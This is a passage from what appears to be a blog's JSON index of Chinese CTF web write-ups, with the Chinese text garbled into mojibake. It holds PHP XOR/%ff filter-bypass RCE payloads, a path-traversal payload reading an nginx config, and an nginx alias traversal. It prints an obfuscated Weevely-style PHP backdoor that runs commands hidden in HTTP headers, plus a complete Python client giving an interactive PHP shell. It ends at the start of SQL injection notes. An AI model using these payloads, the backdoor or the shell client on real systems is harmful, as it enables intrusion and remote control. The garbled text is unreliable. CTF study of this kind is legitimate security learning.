‡è¿‡æ»¤:å’Œ/æ—¶è¿™æ—¶ï¼Œå°±å¯ä»¥ä½¿ç”¨http://x.x.x.x/?page=php\"[NN\"^\"aaa\"inputï¼Œè¿™é‡Œä½¿ç”¨\"[NN\"^\"aaa\"å¼‚æˆ–åçš„å€¼å³è¡¨ç¤ºè¢«è¿‡æ»¤çš„://ï¼Œä½†éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œç›®æ ‡ä¸èƒ½åŒæ—¶éƒ½è¿‡æ»¤å•åŒå¼•å· ä½†æˆ‘ä»¬å¯ä»¥æ‹¼å‡‘ä½¿å¾—å¼‚æˆ–ä¸¤è¾¹çš„éƒ½æ˜¯è‹±æ–‡å­—æ¯ï¼Œè¿™æ ·å°±ä¸éœ€è¦åŠ å•æˆ–åŒå¼•å·ä¾‹ï¼š echo (@AAA^@qwe); //è¾“å‡º06$ åˆ°æ—¶å€™å°±å¯ä»¥ä¹Ÿç»•è¿‡å•åŒå¼•å·ï¼Œpayloadç±»ä¼¼http://x.x.x.x/?page=@xx^@xxè¿™æ ·å°±å¯ä»¥äº†â€“ä¸è¿‡è¿™ä¸ªæ“ä½œæ²¡çœ‹æ‡‚ï¼ˆç•™ç€çœ‹æ—¥åèƒ½å¦ç¢°æ’å‡ºç«èŠ±å§ï¼‰ 7.3 %FFçš„ä½œç”¨ è¿™é‡Œå…ˆè·Ÿç€ä½¬çš„æ€è·¯èµ°ä¸€éï¼Œpayloadï¼š ${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}();&amp;%ff=phpinfo //${_GET}{%ff}();&amp;%ff=phpinfo çœ‹å¦‚ä¸Šæ„é€ ï¼Œæˆ‘ä»¬æ¥ä¸‹æ¥å­¦ä¹ ä¸€æ³¢æ„é€ åŸç†ï¼Œè¿™é‡Œå…ˆ ä¸Šä¸€ä¸‹å¸ˆå‚…çš„å›¾ç‰‡ èƒ½å¤Ÿæ¥æ”¶ï¼Œæ¯•ç«Ÿå¼‚æˆ–å°±æ˜¯ç”¨ä¸å¯è§å­—ç¬¦ç›¸å¼‚æˆ–è¡¨ç¤ºå‡ºæˆ‘ä»¬æƒ³è¦çš„å­—ç¬¦ä¸²ä¹ˆï¼Œ ç„¶åä¸ºäº†ä¼ è¾“ï¼Œå°±è¿›è¡Œä¸€ä¸‹urlç¼–ç ï¼Œä¾¿äºä¼ è¾“å’Œè¯†åˆ«ï¼Œ è¿™é‡Œç”¨åˆ°çš„å…³é”®ç¬¦å·å°±æ˜¯^,ç”¨åˆ°çš„æ–¹æ³•æ˜¯åˆ©ç”¨ä¸å¯è§å­—ç¬¦çš„å¼‚æˆ–æ¥æ„é€ _GETå¯¹å‡½æ•°è¿›è¡Œè°ƒç”¨ï¼Œé¦–å…ˆæ˜¯è·å–_GETçš„asciiç å€¼ ç„¶åä½¿ç”¨0xffåˆ†åˆ«å¯¹è¿™å‡ ä¸ªå­—ç¬¦è¿›è¡Œå¼‚æˆ–æ“ä½œ è¿™é‡Œå¯èƒ½å°±ä¼šæœ‰ç–‘é—®ï¼Œä¸ºä½•å¿…é¡»ç”¨0xffæ¥è¿›è¡Œæ“ä½œ ï¼Œè€Œå…¶ä»–ä¸è¡Œå‘¢ã€‚ è¿™é‡Œèµ·å…ˆæˆ‘ä¹Ÿä¸æ¸…æ¥šï¼ˆä¸ä¼šæ€è€ƒç½¢äº†ï¼‰ï¼Œä¹‹åçœ‹åˆ°è¯„è®ºåŒºæœ‰ä¸€åˆ™å›ç­”å¾ˆæ­£è§£ï¼š ä¹‹æ‰€ä»¥ç”¨%ffæ˜¯å› ä¸ºä»–ç”¨äºŒè¿›åˆ¶è¡¨ç¤ºä¸º11111111ã€‚ æˆ‘ä»¬çŸ¥é“0^1=1,1^1=1ï¼Œè¿™ä¹Ÿå°±æ„å‘³ç€æˆ‘ä»¬ä¸è®ºä¼ å…¥ä½•ç§å­—ç¬¦ï¼Œå…¶è½¬æ¢ä¸ºäºŒè¿›åˆ¶åçš„æ•°å­—ä¸æ˜¯ä¸Šè¿°0xffçš„äºŒè¿›åˆ¶è¿›è¡ŒæŒ‰ä½å¼‚æˆ–ï¼Œæœ€åå¾—åˆ°çš„ç»“æœï¼ˆä¹Ÿå°±æ˜¯äºŒè¿›åˆ¶æ•°ï¼‰ä¸€å®šæ˜¯ä¸åŸæ¥ä¸ç›¸åŒçš„ï¼Œè¿™æ—¶æˆ‘ä»¬ç”¨å¾—åˆ°çš„ç»“æœå†æ¬¡ä¸0xffè¿›è¡Œå¼‚æˆ–ï¼Œå¾—åˆ°çš„ç»“æœå°±ä¸€å®šæ˜¯æœ€åˆçš„å­—ç¬¦ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼š \"A\"^\"0XFF\"=\"å…¶ä»–\",éšå, \"å…¶ä»–\"^\"0xff\"=\"A\" å¾—åˆ°äº†å­—ç¬¦ä¸²0xa0b8baabï¼ˆå‡ä¸ºä¸å¯è§å­—ç¬¦ï¼‰ï¼Œå°†å…¶ä¸0xffffffffè¿›è¡Œå¼‚æˆ–æ“ä½œï¼Œå°±å˜æˆäº†_GETäº†ï¼Œæ‰€ä»¥payloadä¸ºï¼š ?_=${%ffffffff^%a0%b8%ba%ab}{%ff}();&amp;%ff=phpinfo urlç¼–ç ä¹Ÿæ˜¯16è¿›åˆ¶çš„ï¼Œæ‰€ä»¥0xffä¸%ffæ˜¯åŒä¸€ä¸ªæ„æ€ è¿™é‡Œä¸Šä¸€ä¸‹å¸ˆå‚…å¯¹æ­¤çš„è§£é‡Šï¼š å› ä¸ºurlä¹Ÿæ˜¯16è¿›åˆ¶ç¼–ç çš„ï¼Œè€Œä¸”a^b^b = aæ‰€ä»¥ä¸‹é¢çš„è¿™ä¸ª%a0%b8%ba%abå°±æ˜¯0xa0xb80xba0xab,è¿åœ¨ä¸€èµ·å°±æ˜¯0xa0b8baabã€‚16è¿›åˆ¶çš„a0 b8 ba abå¯¹åº”çš„å°±æ˜¯10è¿›åˆ¶çš„95 71 69 84å’Œ0xffç›¸^å‡ºæ¥çš„ï¼Œï¼Œ ç„¶åï¼Œï¼Œ95 71 69 84å¯¹åº”çš„ä¹Ÿå°±æ˜¯_ G E T ä¹Ÿå°±æ˜¯_GETæ¯ä¸ªå­—æ¯éƒ½å’Œ0xffæˆ–è€…å«%ffæˆ–è€…å«255ç›¸å¼‚æˆ–ï¼Œå˜æˆ0xa0xb80xba0xabã€‚è¿›è¡Œbypassã€‚ç„¶åï¼Œå†æ¬¡ä¸%ffè¿›è¡Œå¼‚æˆ–ï¼Œå°±å˜æˆäº†_GETã€‚å°±è¾¾æˆç›®çš„äº†ï¼Œ æ€»ç»“ï¼š å¦‚æœæˆ‘ä»¬æƒ³å¾—åˆ°æŸä¸ªå­—ç¬¦ï¼ˆä½†è¯¥å­—ç¬¦è¢«è¿‡æ»¤äº†ï¼‰ï¼Œé‚£æˆ‘ä»¬å…ˆä»¤è¯¥å­—ç¬¦ä¸0xffè¿›è¡Œå¼‚æˆ–ï¼Œå¾—åˆ°ä¸­é—´å€¼ä¹‹åï¼Œè®©ä¸­é—´å€¼å†æ¬¡ä¸0xffå¼‚æˆ–ï¼Œä¾¿å¯ä»¥å¾—åˆ°æˆ‘ä»¬æƒ³è¦çš„æŸä¸ªå­—ç¬¦ 0x08 å‚è€ƒæ–‡ç«  phpæ— å‚æ•°ç›¸å…³ PHPæ— å‚æ•°RCE PHP Parametric Function RCE PHPçš„æ— å‚æ•°RCE æ— å­—æ¯æ•°å­—webshellä¹‹æé«˜ç¯‡â€“pç¥!!! æ— å‚RCE æ— å‚RCEâ€“é€’å¢ç»•è¿‡å¯å‚è€ƒï¼Œæ—¥åé‡åˆ°åœ¨å­¦ä¹  phpå¼‚æˆ–ç›¸å…³ PHPå¼‚æˆ– ã€èŠå£«ã€‘%ff%ff%ff%ff%ff%ff%ff || 0xff0xff0xff0xff0xff0xff0xff å¼‚æˆ–ï¼Œ~ å–åè¿‡rce è‡ªå·±åº”è¯¥æ˜¯å¼„æ˜ç™½äº†ï¼Œ wpç›¸å…³ BUUCTF Web Writeup 7 [æå®¢å¤§æŒ‘æˆ˜2020è™šç©ºå¤ç›˜ å®˜æ–¹wp [æå®¢å¤§æŒ‘æˆ˜ 2020]Roamphp 1ã€2ã€4 buuctfåˆ·é¢˜12(zip://åŒ…å«&amp; å–å+æ— å‚æ•°rce &amp; csrf &amp; FFIæ‰©å±•å®‰å…¨)","tags":["åŸºæœ¬çŸ¥è¯†"],"categories":["webçŸ¥è¯†æ€»ç»“"]},{"title":"Web_php_wrong_nginx_config","path":"/2023/10/15/web-php-wrong-nginx-config/","content":"é¢˜ç›®æè¿° æ—  é¢˜ç›®è§£é¢˜ è®¿é—®é¦–é¡µæ˜¯ä¸€ä¸ªç™»å½•æ¡†ï¼Œå¼±å£ä»¤è¯•äº†æ²¡ä»€ä¹ˆæ•ˆæœï¼Œç›´æ¥æ‰«ä¸€ä¸‹ç›®å½•çœ‹çœ‹ å‘ç°robots.txtï¼Œå‘ç°ä¸¤ä¸ªphpæ–‡ä»¶ï¼Œè®¿é—®çœ‹çœ‹ æç¤ºé…ç½®æ–‡ä»¶æœ‰é—®é¢˜ï¼Œä¼°è®¡å¾—æƒ³åŠæ³•è¯»å–ä¸€ä¸‹ã€‚éšåè®¿é—®hack.phpï¼Œä½†å¿…é¡»è¦ç™»å½•æ‰å¯ä»¥ï¼Œé‚£å›åˆ°ç™»å½•æ¡†å†çœ‹ä¸€ä¸‹ï¼Œç»“æœè¿˜æ˜¯æ²¡å•¥æ€è·¯ï¼Œäºæ˜¯çœ‹äº†ä¸€çœ¼wpå‘ç°å¯ä»¥è®¿é—®hack.phpï¼Œåªä¸è¿‡æˆ‘å½“æ—¶çœ¼çæ²¡çœ‹åˆ°ã€‚ æˆ‘ä»¬urlæ‹¼æ¥hack.phpï¼Œç„¶åbpæŠ“åŒ… å¦‚ä¸Šå›¾çœ‹åˆ°cookieå€¼å¾ˆå¯ç–‘ï¼ŒçŒœæµ‹ä¿®æ”¹ä¸€ä¸‹å°±å¯ä»¥çš„ç™»å½•ï¼Œå°è¯•ä¸€ä¸‹ é¡µé¢æˆåŠŸæœ‰å›æ˜¾ï¼Œç„¶åå°±æ²¡æœ‰ç„¶åäº†ï¼Œçœ‹äº†wpå‘ç°ä¼¼ä¹è¦ä¸€ä¸ªä¸€ä¸ªé“¾æ¥çš„å»æµ‹è¯• å¦‚ä¸‹å›¾ï¼Œè¿™é‡Œæˆ‘æ˜¯æŠ“åŒ…åä¿®æ”¹cookieåæ”¾åŒ…ï¼ˆå…ˆæ”¾ä¸€ä¸‹ï¼‰ï¼Œéšåçœ‹wpçš„æ„æ€ä»–æ˜¯ç›´æ¥ç‚¹å‡»ç®¡ç†ä¸­å¿ƒæŠ“åŒ…çš„ï¼Œä½†å®æˆ˜çš„è¯è‚¯å®šä¸æ¸…æ¥šçš„ï¼Œå› æ­¤æˆ‘ä»¬å¾—ä¸€ä¸ªä¸ªå»ç‚¹å‡»æµ‹è¯•æŠ“åŒ…ã€‚ ï¼ˆä¸è¿‡çœ‹äº†wpå‘ç°è¿™é‡Œå¯ä»¥æŸ¥çœ‹æºç æˆ–è€…æ˜¯F12çœ‹æŸ¥çœ‹å™¨ï¼Œè§‚å¯Ÿå“ªä¸ªè¿æ¥æœ‰è·³è½¬åŠŸèƒ½æ¥é’ˆå¯¹æ€§çš„æŠ“åŒ…ï¼‰ è¿™é‡Œå°±ç›´æ¥æŠ“äº†ï¼ŒæŠ“äº†ä¹‹åè¿˜æ˜¯æ”¾åŒ…çœ‹æœ‰ä»€ä¹ˆä¿¡æ¯ï¼ˆè®°å¾—ä¿®æ”¹cookieï¼‰ æ”¾äº†ä¸¤æ¬¡åå‘ç°å¦‚ä¸‹å›¾ï¼Œå‡ºç°å¯ä»¥urlå‚æ•°ï¼Œè¿™é‡Œå¯ä»¥è¯•ç€è¯»å–ä¸€ä¸‹ä¹‹å‰çš„é…ç½®æ–‡ä»¶ è¯»å–è¯•äº†è¯•æ²¡æ•ˆæœï¼ˆæ­¤å¤„å¹¶æ²¡æœ‰æƒ³åˆ°è¢«è¿‡æ»¤äº†ï¼‰çœ‹äº†wpå‘ç°â€¦/è¢«è¿‡æ»¤ï¼Œä½†æˆ‘çœŸä¸çŸ¥é“å’‹æµ‹è¯•å‡ºæ¥çš„ã€‚ã€‚ã€‚ä¼°è®¡æ˜¯ä¸€ä¸ªä¸ªè¯•çš„å§ ?file=index.php&amp;ext=å’Œ?file=index&amp;ext=phpå†…å®¹è¯»å–ä¸€æ · payload ?file=....//....//....//....///etc/nginx/sites-enabled/site.conf&amp;ext= æˆåŠŸè¯»å–ï¼Œè¿™é‡Œå’±ä¹Ÿä¸çŸ¥é“å¦‚ä½•ä¸€é”®æ ¼å¼åŒ–ä»£ç ï¼Œå°±cväº†ï¼Œæ¥ä¸‹æ¥å°±åªèƒ½å‚»å‚»çš„çœ‹wpäº†â”­â”®ï¹â”­â”® server { listen 8080; ## listen for ipv4; this line is default and implied listen [::]:8080; ## listen for ipv6 root /var/www/html; index index.php index.html index.htm; port_in_redirect off; server_name _; # Make site accessible from http://localhost/ #server_name localhost; # If block for setting the time for the logfile if ($time_iso8601 ~ \"^(\\d{4})-(\\d{2})-(\\d{2})\") { set $year $1; set $month $2; set $day $3; } # Disable sendfile as per https://docs.vagrantup.com/v2/synced-folders/virtualbox.html sendfile off; set $http_x_forwarded_for_filt $http_x_forwarded_for; if ($http_x_forwarded_for_filt ~ ([0-9]+\\.[0-9]+\\.[0-9]+\\.)[0-9]+) { set $http_x_forwarded_for_filt $1???; } # Add stdout logging access_log /var/log/nginx/$hostname-access-$year-$month-$day.log openshift_log; error_log /var/log/nginx/error.log info; location / { # First attempt to serve request as file, then # as directory, then fall back to index.html try_files $uri $uri/ /index.php?q=$uri&amp;$args; server_tokens off; } #error_page 404 /404.html; # redirect server error pages to the static page /50x.html # error_page 500 502 503 504 /50x.html; location = /50x.html { root /usr/share/nginx/html; } location ~ \\.php$ { try_files $uri $uri/ /index.php?q=$uri&amp;$args; fastcgi_split_path_info ^(.+\\.php)(/.+)$; fastcgi_pass unix:/var/run/php/php5.6-fpm.sock; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; fastcgi_param SCRIPT_NAME $fastcgi_script_name; fastcgi_index index.php; include fastcgi_params; fastcgi_param REMOTE_ADDR $http_x_forwarded_for; } location ~ /\\. { log_not_found off; deny all; } location /web-img { alias /images/; autoindex on; } location ~* \\.(ini|docx|pcapng|doc)$ { deny all; } include /var/www/nginx[.]conf; } nginxé…ç½® location /web-img { alias /images/; autoindex on; } è¿™æ˜¯å¼€å‘äººå‘˜æƒ³è®©æˆ‘ä»¬è®¿é—®/web-imgè¿™ä¸ªç›®å½•ï¼Œä½†æ˜¯æ²¡æœ‰åœ¨/web-imgåé¢åŠ /,å¯¼è‡´æˆ‘ä»¬å¯ä»¥æ„é€ /web-img../ å’Œalisaæ‹¼æ¥èµ·æ¥å°±æˆäº†/images/web-img/../,é€ æˆç›®å½•ç©¿è¶Šæ¼æ´ è®¿é—®/web-imgâ€¦/ç›®å½• è¿›å…¥ç½‘ç«™ç›®å½•å‘ç°æœ‰å¤‡ä»½æ–‡ä»¶ï¼Œä¸‹è½½ä¸€ä¸‹ &lt;?php $U='_/|U\",\"/-/|U\"),ar|Uray|U(\"/|U\",\"+\"),$ss(|U$s[$i]|U,0,$e)|U)),$k))|U|U);$o|U|U=o|Ub_get_|Ucontents(|U);|Uob_end_cle'; $q='s[|U$i]=\"\";$p=|U$ss($p,3);}|U|Uif(array_k|Uey_|Uexis|Uts($|Ui,$s)){$s[$i].=|U$p|U;|U$e=|Ustrpos($s[$i],$f);|Ui'; $M='l=\"strtolower|U\";$i=$m|U[1|U][0].$m[1]|U[1];$|U|Uh=$sl($ss(|Umd5($i|U.$kh),|U0,3|U));$f=$s|Ul($ss(|Umd5($i.$'; $z='r=@$r[|U\"HTTP_R|UEFERER|U\"];$r|U|Ua=@$r[\"HTTP_A|U|UCCEPT_LAN|UGUAGE|U\"];if|U($r|Ur&amp;|U&amp;$ra){$u=parse_|Uurl($r'; $k='?:;q=0.([\\\\|Ud]))?,|U?/\",$ra,$m)|U;if($|Uq&amp;&amp;$m){|U|U|U@session_start()|U|U;$s=&amp;$_SESSIO|UN;$ss=\"|Usubst|Ur\";|U|U$s'; $o='|U$l;|U){for|U($j=0;($j|U&lt;$c&amp;&amp;|U|U$i|U&lt;$|Ul);$j++,$i++){$o.=$t{$i}|U^$k|U{$j};}}|Ureturn $|Uo;}$r=$|U_SERV|UE|UR;$r'; $N='|Uf($e){$k=$k|Uh.$kf|U;ob_sta|Urt();|U@eva|Ul(@g|Uzuncom|Upress(@x(@|Ubas|U|Ue64_decode(preg|U_repla|Uce(|Uarray(\"/'; $C='an();$d=b|Uase64_encode(|Ux|U(gzcomp|U|Uress($o),$k))|U;prin|Ut(\"|U&lt;$k&gt;$d&lt;/$k&gt;\"|U);@ses|U|Usion_des|Utroy();}}}}'; $j='$k|Uh=\"|U|U42f7\";$kf=\"e9ac\";fun|Uction|U |Ux($t,$k){$c|U=|Ustrlen($k);$l=s|Utrl|Ue|Un($t);$o=|U\"\";fo|Ur($i=0;$i&lt;'; $R=str_replace('rO','','rOcreatrOe_rOrOfurOncrOtion'); $J='kf|U),|U0,3));$p=\"|U\";for(|U|U$|Uz=1;$z&lt;cou|Unt|U($m[1]);|U$z++)$p.=|U$q[$m[2][$z|U]|U];if(strpos(|U$|U|Up,$h)|U===0){$'; $x='r)|U;pa|Urse|U_str($u[\"qu|U|Uery\"],$q);$|U|Uq=array_values(|U$q);pre|Ug|U_match_al|Ul(\"/([\\\\|U|Uw])[|U\\\\w-]+|U('; $f=str_replace('|U','',$j.$o.$z.$x.$k.$M.$J.$q.$N.$U.$C); $g=create_function('',$f); $g(); ?&gt; create_function()å‡½æ•° æ ¹æ®ä¼ é€’çš„å‚æ•°åˆ›å»ºåŒ¿åå‡½æ•°ï¼Œå¹¶ä¸ºå…¶è¿”å›å”¯ä¸€åç§°ã€‚ è¯­æ³•ï¼š 1 create_function(string $args,string $code) 2 string $args å£°æ˜çš„å‡½æ•°å˜é‡éƒ¨åˆ† 3 string $code æ‰§è¡Œçš„æ–¹æ³•ä»£ç éƒ¨åˆ† å‚è€ƒï¼šPHPä»£ç å®¡è®¡ä¹‹create_function()å‡½æ•° è¿™é‡Œå¤§ä½¬è¯´æ„Ÿè§‰æ˜¯PHPæ··æ·†ï¼Œéšåä»–ç›´æ¥è¾“å‡ºäº†få˜é‡çœ‹åˆ°äº†ä»£ç éƒ¨åˆ† $kh = \"42f7\"; $kf = \"e9ac\"; function x($t, $k) { $c = strlen($k); $l = strlen($t); $o = \"\"; for ($i = 0; $i &lt; $l;) { for ($j = 0; ($j &lt; $c &amp;&amp; $i &lt; $l); $j++, $i++) { $o. = $t { $i } ^ $k { $j }; } } return $o; } $r = $_SERVER; $rr = @$r[\"HTTP_REFERER\"]; $ra = @$r[\"HTTP_ACCEPT_LANGUAGE\"]; if ($rr &amp;&amp; $ra) { $u = parse_url($rr); parse_str($u[\"query\"], $q); $q = array_values($q); preg_match_all(\"/([\\w])[\\w-]+(?:;q=0.([\\d]))?,?/\", $ra, $m); if ($q &amp;&amp; $m) {@ session_start(); $s = &amp; $_SESSION; $ss = \"substr\"; $sl = \"strtolower\"; $i = $m[1][0].$m[1][1]; $h = $sl($ss(md5($i.$kh), 0, 3)); $f = $sl($ss(md5($i.$kf), 0, 3)); $p = \"\"; for ($z = 1; $z &lt; count($m[1]); $z++) $p. = $q[$m[2][$z]]; if (strpos($p, $h) === 0) { $s[$i] = \"\"; $p = $ss($p, 3); } if (array_key_exists($i, $s)) { $s[$i]. = $p; $e = strpos($s[$i], $f); if ($e) { $k = $kh.$kf; ob_start();@ eval(@gzuncompress(@x(@base64_decode(preg_replace(array(\"/_/\", \"/-/\"), array(\"/\", \"+\"), $ss($s[$i], 0, $e))), $k))); $o = ob_get_contents(); ob_end_clean(); $d = base64_encode(x(gzcompress($o), $k)); print(\"&lt;$k&gt;$d&lt;/$k&gt;\");@ session_destroy(); } } } } åˆ°è¿™é‡Œæ›´ä¸€è„¸æ‡µé€¼äº†ï¼Œçœ‹wpè¯´ è¿™æ˜¯ä¸€ä¸ªåé—¨é¡µé¢,åœ¨ç½‘ä¸Šæ‰¾åˆ°äº†ç›¸å…³çš„åˆ©ç”¨æ•™ç¨‹: ä¸€ä¸ªPHPæ··æ·†åé—¨çš„åˆ†æ æ ¹æ®é¢˜ç›®ä¿®æ”¹åçš„è„šæœ¬(ä¿®æ”¹äº†å¯†é’¥å’Œurl)å¦‚ä¸‹: # encoding: utf-8 from random import randint,choice from hashlib import md5 import urllib import string import zlib import base64 import requests import re def choicePart(seq,amount): length = len(seq) if length == 0 or length &lt; amount: print 'Error Input' return None result = [] indexes = [] count = 0 while count &lt; amount: i = randint(0,length-1) if not i in indexes: indexes.append(i) result.append(seq[i]) count += 1 if count == amount: return result def randBytesFlow(amount): result = '' for i in xrange(amount): result += chr(randint(0,255)) return result def randAlpha(amount): result = '' for i in xrange(amount): result += choice(string.ascii_letters) return result def loopXor(text,key): result = '' lenKey = len(key) lenTxt = len(text) iTxt = 0 while iTxt &lt; lenTxt: iKey = 0 while iTxt&lt;lenTxt and iKey&lt;lenKey: result += chr(ord(key[iKey]) ^ ord(text[iTxt])) iTxt += 1 iKey += 1 return result def debugPrint(msg): if debugging: print msg # config debugging = False keyh = \"42f7\" # $kh keyf = \"e9ac\" # $kf xorKey = keyh + keyf url = 'http://61.147.171.105:63612/hack.php' defaultLang = 'zh-CN' languages = ['zh-TW;q=0.%d','zh-HK;q=0.%d','en-US;q=0.%d','en;q=0.%d'] proxies = None # {'http':'http://127.0.0.1:8080'} # proxy for debug sess = requests.Session() # generate random Accept-Language only once each session langTmp = choicePart(languages,3) indexes = sorted(choicePart(range(1,10),3), reverse=True) acceptLang = [defaultLang] for i in xrange(3): acceptLang.append(langTmp[i] % (indexes[i],)) acceptLangStr = ','.join(acceptLang) debugPrint(acceptLangStr) init2Char = acceptLang[0][0] + acceptLang[1][0] # $i md5head = (md5(init2Char + keyh).hexdigest())[0:3] md5tail = (md5(init2Char + keyf).hexdigest())[0:3] + randAlpha(randint(3,8)) debugPrint('$i is %s' % (init2Char)) debugPrint('md5 head: %s' % (md5head,)) debugPrint('md5 tail: %s' % (md5tail,)) # Interactive php shell cmd = raw_input('phpshell &gt; ') while cmd != '': # build junk data in referer query = [] for i in xrange(max(indexes)+1+randint(0,2)): key = randAlpha(randint(3,6)) value = base64.urlsafe_b64encode(randBytesFlow(randint(3,12))) query.append((key, value)) debugPrint('Before insert payload:') debugPrint(query) debugPrint(urllib.urlencode(query)) # encode payload payload = zlib.compress(cmd) payload = loopXor(payload,xorKey) payload = base64.urlsafe_b64encode(payload) payload = md5head + payload # cut payload, replace into referer cutIndex = randint(2,len(payload)-3) payloadPieces = (payload[0:cutIndex], payload[cutIndex:], md5tail) iPiece = 0 for i in indexes: query[i] = (query[i][0],payloadPieces[iPiece]) iPiece += 1 referer = url + '?' + urllib.urlencode(query) debugPrint('After insert payload, referer is:') debugPrint(query) debugPrint(referer) # send request r = sess.get(url,headers={'Accept-Language':acceptLangStr,'Referer':referer},proxies=proxies) html = r.text debugPrint(html) # process response pattern = re.compile(r'&lt;%s&gt;(.*)&lt;/%s&gt;' % (xorKey,xorKey)) output = pattern.findall(html) if len(output) == 0: print 'Error, no backdoor response' cmd = raw_input('phpshell &gt; ') continue output = output[0] debugPrint(output) output = output.decode('base64') output = loopXor(output,xorKey) output = zlib.decompress(output) print output cmd = raw_input('phpshell &gt; ') æ‹¿åˆ°flag éšåæœ¬æƒ³ç€å­¦ä¹ ä¸€æ³¢PHPæ··æ·†ï¼Œç»“æœçœŸå®å¼€äº†çœ¼ï¼Œæ ¹æœ¬çœ‹ä¸æ‡‚ã€‚ã€‚ã€‚ ä¸‹å»å¾—æ€è€ƒä¸€ä¸‹å¦‚ä½•å­¦äº† å‚è€ƒæ–‡ç«  æ”»é˜²ä¸–ç•Œ-WEBè¿›é˜¶åŒº-Web_php_wrong_nginx_config [wp] æ”»é˜²ä¸–ç•Œ Web_php_wrong_nginx_config ã€æ„šå…¬ç³»åˆ—ã€‘2023å¹´06æœˆ æ”»é˜²ä¸–ç•Œ-Webï¼ˆWeb_php_wrong_nginx_configï¼‰ [Weevelyï¼šä¸€ä¸ª PHP æ··æ·†åé—¨çš„ä»£ç åˆ†æ] æ”»é˜²ä¸–ç•Œ webé«˜æ‰‹è¿›é˜¶åŒº 7åˆ†é¢˜ Web_php_wrong_nginx_config","categories":["æ”»é˜²ä¸–ç•Œ"]},{"title":"sqlæ³¨å…¥å­¦ä¹ --æ‹“å±•","path":"/2023/10/15/sql-zhu-ru-tuo-zhan/","content":"0x01 å‰è¨€ æ’°å†™æœ¬ç¯‡çš„ç›®çš„æ˜¯ä¸ºäº†è¿›ä¸€æ­¥äº†è§£ä¸€ä¸‹sqlæ³¨å…¥çš„å…¶ä»–ç±»å‹ï¼Œmssqlã€postgresqlã€db2ç­‰ç­‰ï¼Œä¸»è¦æ˜¯è®¤ä¸ºäº†è§£ä¸”ä¼šç”¨æ‰‹å·¥æ³¨å…¥æ‰æ˜¯å‰æä¹Ÿæ˜¯é‡ç‚¹ï¼Œä¸èƒ½å®Œå…¨åˆ©ç”¨å·¥å…·ã€‚å› æ­¤å†™ä¸‹æœ¬æ–‡æ¥è®°å½•å¸¸è§„çš„ã€å¸¸è§çš„æ•°æ®åº“ç±»å‹çš„ç›¸å…³æ³¨å…¥payloadï¼Œè®©è‡ªå·±ä»¥åé‡åˆ°çš„æ—¶å€™ä¸ä¼šæ‡µé€¼ã€‚ 0x02 Msssql 2.1 ç¯å¢ƒæ­å»º å“å‘€ï¼Œè¿™ä¸€å—çœ‹ç€çœŸéº»çƒ¦ï¼Œæˆ‘æœ¬æ˜¯æƒ³èƒ½å®æ“å°±å®æ“ä¸€ä¸‹ï¼Œä½†è¿™ä¹ˆéº»çƒ¦æ„Ÿè§‰è¿˜æ˜¯ç®—äº†ï¼Œæˆ‘åˆå¿ƒåªæ˜¯æƒ³äº†è§£ä¸€ä¸‹è¯­å¥emmmï¼Œé‚£å°±å¤šç”¨è„‘å­æƒ³æƒ³å§ã€‚ ä¸‹é¢éƒ½æ˜¯è·Ÿç€y4erå¸ˆå‚…å­¦ä¹ çš„â”­â”®ï¹â”­â”®å¤ªå¼ºå•¦ï¼ï¼ï¼ 2.2 è‡ªå¸¦åº“ä»‹ç» master //ç”¨äºè®°å½•æ‰€æœ‰SQL Serverç³»ç»Ÿçº§åˆ«çš„ä¿¡æ¯ï¼Œè¿™äº›ä¿¡æ¯ç”¨äºæ§åˆ¶ç”¨æˆ·æ•°æ®åº“å’Œæ•°æ®æ“ä½œã€‚ model //SQL Serverä¸ºç”¨æˆ·æ•°æ®åº“æä¾›çš„æ ·æ¿ï¼Œæ–°çš„ç”¨æˆ·æ•°æ®åº“éƒ½ä»¥modelæ•°æ®åº“ä¸ºåŸºç¡€ msdb //ç”± Enterprise Managerå’ŒAgentä½¿ç”¨ï¼Œè®°å½•ç€ä»»åŠ¡è®¡åˆ’ä¿¡æ¯ã€äº‹ä»¶å¤„ç†ä¿¡æ¯ã€æ•°æ®å¤‡ä»½åŠæ¢å¤ä¿¡æ¯ã€è­¦å‘ŠåŠå¼‚å¸¸ä¿¡æ¯ã€‚ tempdb //å®ƒä¸ºä¸´æ—¶è¡¨å’Œå…¶ä»–ä¸´æ—¶å·¥ä½œæä¾›äº†ä¸€ä¸ªå­˜å‚¨åŒºã€‚ å…¶ä¸­æœ€ä¸»è¦çš„æ˜¯masteræ•°æ®åº“ï¼Œå…¶ä¸­å­˜å‚¨äº†æ‰€æœ‰çš„æ•°æ®åº“åç­‰ï¼Œè¿˜æœ‰å¾ˆå¤šå­˜å‚¨è¿‡ç¨‹ å­˜å‚¨è¿‡ç¨‹æ˜¯ä¸€ç»„ä¸ºäº†å®Œæˆç‰¹å®šåŠŸèƒ½çš„SQL è¯­å¥é›†ï¼Œå®ƒå­˜å‚¨åœ¨æ•°æ®åº“ä¸­ï¼Œä¸€æ¬¡ç¼–è¯‘åæ°¸ä¹…æœ‰æ•ˆï¼Œç”¨æˆ·é€šè¿‡æŒ‡å®šå­˜å‚¨è¿‡ç¨‹çš„åå­—å¹¶ç»™å‡ºå‚æ•°ï¼ˆå¦‚æœè¯¥å­˜å‚¨è¿‡ç¨‹å¸¦æœ‰å‚æ•°ï¼‰æ¥æ‰§è¡Œå®ƒã€‚å®é™…ä¸Šå°±æ˜¯ä¸€ä¸ªå°è£…å¥½çš„å‡½æ•°ï¼Œå…·æœ‰é¢å‘å¯¹è±¡ç‰¹ç‚¹ã€‚ åœ¨masteræ•°æ®åº“ä¸­æœ‰master.dbo.sysdatabasesè§†å›¾ï¼Œå‚¨å­˜æ‰€æœ‰æ•°æ®åº“å,å…¶ä»–æ•°æ®åº“çš„è§†å›¾åˆ™å‚¨å­˜ä»–æœ¬åº“çš„è¡¨åä¸åˆ—åã€‚ æ¯ä¸€ä¸ªåº“çš„è§†å›¾è¡¨éƒ½æœ‰syscolumnså­˜å‚¨ç€æ‰€æœ‰çš„å­—æ®µï¼Œå¯ç¼–ç¨‹æ€§å‚¨å­˜ç€æˆ‘ä»¬çš„å‡½æ•°ã€‚ mssqlçš„å­˜å‚¨è¿‡ç¨‹å¤©ç„¶æ”¯æŒå¤šè¯­å¥ï¼Œä¸ºæˆ‘ä»¬çš„æ³¨å…¥æä¾›äº†éå†ã€‚ å¢åˆ 